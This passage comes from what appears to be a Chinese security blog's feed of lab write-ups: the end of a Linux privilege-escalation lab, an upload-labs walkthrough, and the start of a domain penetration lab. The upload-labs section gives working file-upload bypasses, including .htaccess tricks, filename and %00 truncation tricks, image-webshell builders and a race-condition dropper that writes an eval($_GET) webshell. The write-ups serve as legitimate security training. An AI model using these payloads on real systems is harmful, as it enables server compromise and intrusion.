src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819151830970.png" alt="image-20210819151830970"></p><blockquote><p>没有破解出来</p></blockquote><p>在网站的<code>admin</code>目录下，有一个<code>.htpasswd</code>文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819153651796.png" alt="image-20210819153651796"></p><p>先base64解码然后使用base32解码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152218458.png" alt="image-20210819152218458"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152353530.png" alt="image-20210819152353530"></p><p>不能使用密码连接ssh，所以直接利用反弹回来的shell切换用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152640506.png" alt="image-20210819152640506"></p><p>直接利用python提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152808250.png" alt="image-20210819152808250"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210819152831931.png" alt="image-20210819152831931"></p><p><strong>总结</strong></p><p>对于外网渗透，还是缺少一点想法，需要多加练习提高对漏洞的敏感度，对于Linux的提权也是比较熟悉了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传靶场</title>
    <link href="/2021/09/04/upload-labs/"/>
    <url>/2021/09/04/upload-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210917090552341.png" alt="image-20210917090552341"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>上传 <code>.htaccess</code> </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>文件会自动重命名所以不能上传 <code>.htaccess</code> 文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916150810180.png" alt="image-20210916150810180"></p><p>可以大小写绕过上传但是系统好像不能解析，访问到的结果是错误的</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916151446824.png" alt="image-20210916151446824"></p><p>与之前相比去掉了除去空格的函数</p><p>末尾加空格即可绕过上传 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916151421240.png" alt="image-20210916151421240"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916153630164.png" alt="image-20210916153630164"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916153800164.png" alt="image-20210916153800164"></p><p><code>.htaccess</code> 文件不能上传</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154001285.png" alt="image-20210916154001285"></p><p>文件末尾加点绕过，以为 Windows 对文件的解析特性，Windows 会对文件末尾的<code>.</code> 自动忽略</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>禁止了一大堆文件后缀</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154257014.png" alt="image-20210916154257014"></p><blockquote><p>和之前相比少了去除 ::$DATA 这一步</p></blockquote><p>文件名后面添加 <code>::$DATA</code> 实现绕过</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916154718353.png" alt="image-20210916154718353"></p><blockquote><p>这个也是 Windows 的特性</p></blockquote><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916155134664.png" alt="image-20210916155134664"></p><p>这次使用的是白名单</p><p><img src="D:\markdown\image-20210916160139526.png" alt="image-20210916160139526"></p><p>上传后缀 <code>shell.php. .</code></p><p>原理就是：首先会消除文件后的空，然后去除掉最后一个点，最后再消除末尾的空，这样就变成了<code>shell.php.</code> 成功绕过检查</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160336188.png" alt="image-20210916160336188"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160745954.png" alt="image-20210916160745954"></p><blockquote><p>好家伙全给去除了</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916160814358.png" alt="image-20210916160814358"></p><p>双写绕过</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161037159.png" alt="image-20210916161037159"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161154457.png" alt="image-20210916161154457"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916161213142.png" alt="image-20210916161213142"></p><p>这里是使用 <code>%00</code> 截断绕过</p><ul><li>PHP 版本 &lt; 5.3.4</li><li>PHP 的魔术引号即 <code>magic_quotes_gpc</code> 为 OFF 关闭状态</li></ul><blockquote><p>本地环境不合适所以就简单写一下操作过程</p></blockquote><p>将上传文件的目的地址写为<code>../upload/shell.php%00</code></p><p>上传的文件为<code>test.jpg</code></p><p>最后上传到服务器的结果就是 <code>../upload/shell.php%00/test.jpg</code> 雪茹文件时，函数读到 <code>%00</code> 就会当成结束符而把后面字符的直接忽略掉，这样就会直接生成一个 <code>../upload/shell.php</code> 文件</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>利用 <code>0x00</code> 截断绕过，<code>%00</code> 与 <code>0x00</code> 的区别就是 <code>%00</code> 截断是URL编码的表现，用于 GET 方法 <code>0x00</code>截断是二进制编码的表现，用户POST方法。由于POST不会像 GET 一样自动对URL解码，所以我们需要在 HEX 中直接进行二进制修改为 00</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916162855128.png" alt="image-20210916162855128"></p><p>直接修改添加文件头即可绕过检查，添加 <code>GIF89A</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163149385.png" alt="image-20210916163149385"></p><p>图片马的制作</p><ul><li>GIF 直接添加 GIF89a</li><li>JPG 准备一句话木马和一个jpg图片 <code> copy 1.jpg /b + 2.php /a  shell.jpg</code> 即可生成</li><li>PNG 与上面类似</li></ul><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163920293.png" alt="image-20210916163920293"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916163934575.png" alt="image-20210916163934575"></p><blockquote><p>需要制作一个高仿的图片码</p></blockquote><p><img src="D:\markdown\image-20210916164251000.png" alt="image-20210916164251000"></p><blockquote><p>纸老虎，这都拦不住</p></blockquote><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916164341948.png" alt="image-20210916164341948"></p><p>直接添加 <code>GIF89a</code> 不能绕过了</p><p><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名。</p><p>看来必须正儿八经的做一个图片马了，使用 copy 命令制作一个图片马上传即可</p><blockquote><p>靶场出问题了，正常图片都不能上传</p></blockquote><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916165351432.png" alt="image-20210916165351432"></p><blockquote><p>二次渲染绕过</p></blockquote><p><code>imagecreatefromjpeg()</code> 由文件或URL创建一个新图象</p><p>严格判断文件后缀是否合法，并且 Content-Type 是否为对应的图像类型，最后调用<code> imagecreatefromjpeg()</code> 等函数对图像进行二次编译即进行二次渲染。绕过的方法：同样使用图片木马上传，但是需要对图像未进行二次编译的位置进行分析，再往该位置插入恶意 PHP 代码，不同的图像类型插入的方式有区别</p><blockquote><p>简单来说就是比较上传前后图片没有变的位置，在没有改变的地方插入木马后门</p></blockquote><p>PNG</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$p = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br>$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) &#123;<br>   $r = $p[$y];<br>   $g = $p[$y+<span class="hljs-number">1</span>];<br>   $b = $p[$y+<span class="hljs-number">2</span>];<br>   $color = imagecolorallocate($img, $r, $g, $b);<br>   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);<br>&#125;<br><br>imagepng($img,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行上面脚本直接生成图片，上传即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916170941448.png" alt="image-20210916170941448"></p><blockquote><p>还有其他的图片木马生成方法，这里就没有一一尝试了</p></blockquote><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916171133418.png" alt="image-20210916171133418"></p><p>这里的检查方法是用户文件先上传到文件目录之后，再检查是否合法并执行删除操作，所以可以利用条件竞争的方法上传文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>; fputs(fopen(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo(); @eval($_GET[c]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用 burp 一边上传，然后使用 python 脚本持续访问，上传成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916172537339.png" alt="image-20210916172537339"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br>$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    $imgFileName =time();<br>    $u = <span class="hljs-keyword">new</span> MyUpload($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],$imgFileName);<br>    $status_code = $u-&gt;upload(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> ($status_code) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            $is_upload = <span class="hljs-literal">true</span>;<br>            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            $msg = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-1</span>:<br>            $msg = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-2</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-3</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-4</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-5</span>:<br>            $msg = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">-6</span>:<br>            $msg = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            $msg = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> $cls_arr_ext_accepted = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> $dir </span>)</span>&#123;<br>    <br>    $ret = <span class="hljs-keyword">$this</span>-&gt;isUploadedFile();<br>    <br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;setDir( $dir );<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkExtension();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );<br>    &#125;<br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;checkSize();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      $ret = <span class="hljs-keyword">$this</span>-&gt;checkFileExists();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    $ret = <span class="hljs-keyword">$this</span>-&gt;move();<br>    <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-keyword">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      $ret = <span class="hljs-keyword">$this</span>-&gt;renameFile();<br>      <span class="hljs-keyword">if</span>( $ret != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( $ret );    <br>      &#125;<br>    &#125;<br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;resultUpload( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br><br><br></code></pre></td></tr></table></figure><blockquote><p>条件竞争与解析漏洞</p></blockquote><p>Apache1.x，2.x中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断，所以我们可以再 php 后随便加上一个没有的后缀，这样 Apache 就可以解析了，在文件重命名前将访问文件</p><p><a href="https://www.cnblogs.com/HelloCTF/p/13189084.html">https://www.cnblogs.com/HelloCTF/p/13189084.html</a></p><blockquote><p>这么多请求虚拟机有点受不了，原理方法就是这样</p></blockquote><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916174628402.png" alt="image-20210916174628402"></p><blockquote><p>听到 POST 就开始对 0x00 敏感了</p></blockquote><p>绕过方法：</p><ul><li>点绕过</li><li>::$DATA 绕过</li><li>空格绕过</li><li>大小写绕过</li><li>Apache 解析漏洞绕过</li><li>0x00 截断 （环境不支持）</li></ul><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175255368.png" alt="image-20210916175255368"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175230483.png" alt="image-20210916175230483"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916175620779.png" alt="image-20210916175620779"></p><ul><li>检查了 Content-Type</li><li>文件后缀</li></ul><p><code>explode(separator,string,limit)</code>函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p><p><code>end(array)</code>函数，输出数组中的当前元素和最后一个元素的值。</p><p><code>reset(array)</code>函数，把数组的内部指针指向第一个元素，并返回这个元素的值</p><p><code>count(array)</code>函数，计算数组中的单元数目，或对象中的属性个数</p><p>原理简单，不过多写了。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916180803908.png" alt="image-20210916180803908"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210916180939375.png" alt="image-20210916180939375"></p><p>参考文章</p><p><a href="https://fuping.site/2018/06/04/upload-labs-writeup/">https://fuping.site/2018/06/04/upload-labs-writeup/</a></p><p><a href="https://threezh1.com/2019/04/16/Upload-labs-Writeup/#Pass-09">https://threezh1.com/2019/04/16/Upload-labs-Writeup/#Pass-09</a></p><p><a href="https://www.freebuf.com/articles/web/265245.html">https://www.freebuf.com/articles/web/265245.html</a></p><p><a href="https://www.mi1k7ea.com/2019/10/05/upload-labs-WriteUp/">https://www.mi1k7ea.com/2019/10/05/upload-labs-WriteUp/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Freebuf域渗透靶场</title>
    <link href="/2021/09/02/Freebuf%E9%9D%B6%E5%9C%BA/"/>
    <url>/2021/09/02/Freebuf%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Freebuf-域渗透靶场"><a href="#Freebuf-域渗透靶场" class="headerlink" title="Freebuf 域渗透靶场"></a>Freebuf 域渗透靶场</h1><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p><a href="https://www.freebuf.com/articles/web/265049.html">https://www.freebuf.com/articles/web/265049.html</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/%E5%9F%9F%E6%A3%AE%E6%9E%97.png" alt="域森林"></p><p>搭建靶场就是一般步骤</p><p>需要注意的步骤</p><ol><li><p>修改父域的DNS设置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802113055188.png" alt="image-20210802113055188"></p></li><li><p>财务域是一个单独的域环境，财务核心系统属于财务域</p></li><li><p>web服务器直接拿的红日改的，真方便</p></li></ol><p>经过后期的攻击，发现子域和父域之间存在一些问题，未找到原因！安装配置时只需要添加好网卡，自己增加用户即可</p><blockquote><p>虚拟机是真的卡…………两台电脑一起干最舒服</p></blockquote><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="外网攻击"><a href="#外网攻击" class="headerlink" title="外网攻击"></a>外网攻击</h3><blockquote><p>网站漏洞主要就是常见的：逻辑漏洞，弱口令，信息泄露，SQL注入，文件上传，命令执行，文件包含，XSS……</p></blockquote><p>拿到网站，首先看登录点，找一下是否存在管理员登录入口（对于已知的CMS可以直接上网查），扫描目录的时候需要控制频率不然容易被封IP，可以找cms的历史漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172029664.png" alt="image-20210802172029664"></p><p>直接找到后台登录点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802171633017.png" alt="image-20210802171633017"></p><p>这里种情况就先找一下网站是否有默认账户密码，万能密码，SQL注入等，上面有默认密码所以直接尝试</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172221644.png" alt="image-20210802172221644"></p><p>登录成功，找到可以获取shell的点，前台模板处找到一个可以直接写入PHP的点，上传木马，下一步需要找到马的位置，查找网上CMS的网站目录然后找出文件位置（推荐）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802172701737.png" alt="image-20210802172701737"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173539349.png" alt="image-20210802173539349"></p><p>连接木马，开始内网渗透</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173703124.png" alt="image-20210802173703124"></p><h3 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><p>第一次写，各种信息收集的命令都写一下</p></blockquote><h5 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h5><ol><li><p>获取IP信息（是否有内网IP）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174344376.png" alt="image-20210802174344376"></p></li><li><p>查看本机权限（为了后期提权）：<code>whoami</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802173929555.png" alt="image-20210802173929555"></p></li><li><p>查看系统信息（查看是否有域环境，获取补丁信息，系统版本等信息）：<code>systeminfo</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174020113.png" 